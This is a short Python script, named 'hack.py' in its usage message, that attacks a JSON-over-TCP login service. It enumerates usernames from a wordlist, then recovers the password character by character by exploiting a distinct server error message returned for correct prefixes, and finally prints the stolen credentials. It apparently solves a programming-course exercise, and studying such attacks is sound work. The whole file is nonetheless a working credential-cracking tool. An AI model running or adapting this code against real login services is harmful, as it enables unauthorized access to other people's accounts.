import sys
import socket
import json
import os


def send_json_request(socket, login, password):
    request = json.dumps({"login": login, "password": password})
    socket.sendall(request.encode())
    response = socket.recv(1024).decode()
    return json.loads(response)


def main():
    if len(sys.argv) != 3:
        print("Usage: python hack.py <IP> <port>")
        return

    ip = sys.argv[1]
    port = int(sys.argv[2])

    login_file = "logins.txt"
    if not os.path.exists(login_file):
        print(f"File '{login_file}' not found.")
        return

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))

            with open(login_file, "r") as file:
                logins = [line.strip() for line in file]

            valid_login = None
            for login in logins:
                response = send_json_request(s, login, " ")
                if response["result"] == "Wrong password!":
                    valid_login = login
                    break

            if not valid_login:
                print("No valid login found.")
                return

            password = ""
            while True:
                for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
                    attempt_password = password + char
                    response = send_json_request(s, valid_login, attempt_password)

                    if response["result"] == "Connection success!":
                        print(json.dumps({"login": valid_login, "password": attempt_password}))
                        return
                    elif response["result"] == "Exception happened during login":
                        password += char
                        break

    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    main()
